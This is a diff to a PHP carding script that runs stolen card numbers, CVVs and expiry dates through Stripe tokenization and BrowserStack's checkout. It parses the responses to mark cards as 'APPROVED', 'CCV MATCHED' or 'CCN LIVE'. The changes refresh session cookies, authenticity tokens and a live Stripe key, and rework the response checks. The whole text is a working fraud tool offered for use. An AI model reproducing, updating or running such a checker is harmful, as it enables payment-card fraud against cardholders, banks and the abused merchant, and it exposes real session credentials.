@@ -135,7 +135,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]=10080&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1e9e7d73-6a20-4464-803a-be1f0b07042b1d397d&muid=1c44198c-cde1-4e21-9bd8-271bc20c2aa70d1f9b&sid=dd109258-da1f-4edc-ab3a-71043a6a34b156c024&payment_user_agent=stripe.js%2Fcf29918aa%3B+stripe-js-v3%2Fcf29918aa&time_on_page=19387&key=pk_live_40g8bjuzvlOrPg0e4GbbFXEBOwi8nvCnSMrwT5IORblarHzU5aYFEaS5QS6pCvJqmjKZTK6fAqyJPNzJ0dytSjW3000N5fu36y3&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6903df19-82a2-4e79-9c32-942c8ba962510b19fd&muid=964fa07a-1403-4779-92ce-29b39602f7c21b7717&sid=9b9f5148-94c2-4f00-bea4-ffbaf5613559b2844e&payment_user_agent=stripe.js%2Fdca8db2fe%3B+stripe-js-v3%2Fdca8db2fe&time_on_page=44468&key=pk_live_40g8bjuzvlOrPg0e4GbbFXEBOwi8nvCnSMrwT5IORblarHzU5aYFEaS5QS6pCvJqmjKZTK6fAqyJPNzJ0dytSjW3000N5fu36y3&pasted_fields=number');
 
 
 
@@ -165,7 +165,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'accept: text/javascript, application/json',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: tracking_id=bc472f74-a97d-43a7-9221-0390cf0aa05f; moved=1; bs_deviceId=8a0d6119-72bf-48c6-c400-188bc896e669; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"5d0a273b-9f6d-4c36-95ec-52ec1af6eac7","60":129,"40":87,"55":119,"63":133,"48":105,"54":117}; ga_pa_status=npa; p_list=["pricing"]; _session=051efe502b1afd7a04aa29d03e6d319e; bs_logging_id=5953389; bs_group_id=5870595; bs_user_details={"user_details":{"user_id":5953389,"group_id":5870595},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; show_freshchat=2; __cf_bm=t5bQQVDD1JI2c6VSM2QhN6it6zshXwvTB2fhsRaIJnY-1649258536-0-AdZQViv9UiqNvvfsULWdHzlMGzLleOESgLuj8fBv+Jn/4PVpQxJFk0s/pB/WsX32CVK4mZua3xLjgCFLBYxo2Ec=; __cfruid=5b40b35c006ec3fdf3f725b4ccfa3b653cde48c2-1649258536; GAstartTime=1649258544206; GAlastSentTime=1649258591425',
+'cookie: __cf_bm=bXuMxzIhAJZGKdbh2KRBK2brz5E82b8ucbFJNZuw864-1649356585-0-AU4Owmo2C+oqzlXOeV4tMHSLGLXQV6azNSd/+fGHTm363RTZC3q3QHiivBvLhu7Lp5TFAaoCNY+PHRefV9jMFR4=; __cfruid=6ca9bbcfc4bb902a887a7b462ab419f55b3cb278-1649356585; tracking_id=84551956-c868-45d9-a313-b4285d705c39; moved=1; GAstartTime=1649356592285; bs_deviceId=43fb6652-0075-b142-5b61-b0bdc40c8e6b; _gcl_au=1.1.724127214.1649356593; _vwo_uuid_v2=D1081FFC137974B05885D34B9B6FC8B26|bf64779579b28284f3bcdcc2244ed530; _ga=GA1.2.1635842230.1649356605; _gid=GA1.2.1002670171.1649356605; _vis_opt_s=1|; _vis_opt_test_cookie=1; _vwo_uuid=D1081FFC137974B05885D34B9B6FC8B26; _vwo_ds=3:t_0,a_0:0$1649356591:23.64326981:::5_0,3_0:1; _fbp=fb.1.1649356611774.1756913871; tft_exp_allocated=signup; _rdt_uuid=1649356637372.c1d55248-af6c-49d9-a96d-7e317b6e6f5d; _vwo_uuid_v2=D1081FFC137974B05885D34B9B6FC8B26|bf64779579b28284f3bcdcc2244ed530; _session=5e4793243121051449d590f9e5eef5ec; bs_logging_id=5961847; bs_group_id=5878996; bs_user_details={"user_details":{"user_id":5961847,"group_id":5878996},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; _clck=11gilga|1|f0f|0; ab_users={"48":105,"_allocation":"f6556e5d-eab8-4335-af69-f7675971bc5f","54":116,"49":107,"60":129,"40":87,"55":119,"63":134}; show_freshchat=2; bs_chat_channels=free_user; _vwo_sn=0:6; _vis_opt_exp_535_combi=1; ga_pa_status=npa; p_buy=false; _gat_browserstack=1; _gat=1; _uetsid=c11f2360b6a111ec87673383b25650f5; _uetvid=c11f5e30b6a111ecbf65dfd6eff9eb40; _clsk=wj4kv3|1649356976379|3|1|i.clarity.ms/collect; GAlastSentTime=1649356999278; amp_985eaa=43fb6652-0075-b142-5b61-b0bdc40c8e6b.NTk2MTg0Nw==..1g02l116d.1g02lddin.16.p.1v',
 'origin: https://www.browserstack.com',
 'referer: https://www.browserstack.com/',
 'sec-fetch-dest: empty',
@@ -176,7 +176,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=wRfcEhSG7jmGVAZ1KzahNsSfBQNMTG%2F4%2FlaLBQPxS8mGqeGT8PsczB4mXNWWnVEPjsdkknWyf2Go%2FIzKeqGn4g%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=ek63QzBfn3fBBKVlAm8AXX9A2wN7JOBM9f6vj5EEKPo98IrC1CJtgll2%2F8W%2FxPBkNRi6kkLa8NWjVKhA6FTE0Q%3D%3D');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=c2%2B%2BF69OUC4zatB6hUsg94x76b3iL0Nc4uGs2sOuQStadej2SWW%2FMH1pyS9vXQTHHazwTNXHMx7UvSXn58Pgnw%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&gaCID=1635842230.1649356605&cardDetails=null&authenticity_token=JcyAMAx4X78puANkhahWjr7c4%2FQXxDRuWW%2BsdovZ02sM1tbR6lOwoWe7GjFvvnK%2BLwv6BSAsRCxvMyVLr7Ry3w%3D%3D');
 
 
 $result2 = curl_exec($ch);
@@ -226,7 +226,7 @@ elseif
 
 elseif
 (strpos($result2,  "Your card does not have sufficient funds. Please update your card details in our payment section.")) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- NO BALANCE.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
+    echo '</br><span class="badge badge-success">APPROVED</span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-warning">CCV MATCHED {MSG:- NO BALANCE.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
 } 
 
 elseif
@@ -240,8 +240,8 @@ elseif
 } 
 
 elseif
-(strpos($result2,  "incorrect_zip")) {
-    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
+(strpos($result2,  "Please update your card details in our payment section.")) {
+    echo '</br><span class="badge badge-success"APPROVED</span> : <span class="badge badge-primary"> ' . $lista . ' </span> <span class="badge badge-warning">CCV MATCHED sufficient funds</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
 } 
 
 
@@ -258,7 +258,7 @@ elseif
 
 elseif
 (strpos($result2,  'Something went wrong.')) {
-    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 ANONBD 👑 </span></br>';
+    echo '</br><span class="badge badge-success">Aprovada</span> : <span class="badge badge-primary"> ' . $lista . ' </span>|  <span class="badge badge-warning">CCN LIVE Security Code Is Incorrect</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span></br>';
 }
 
 elseif
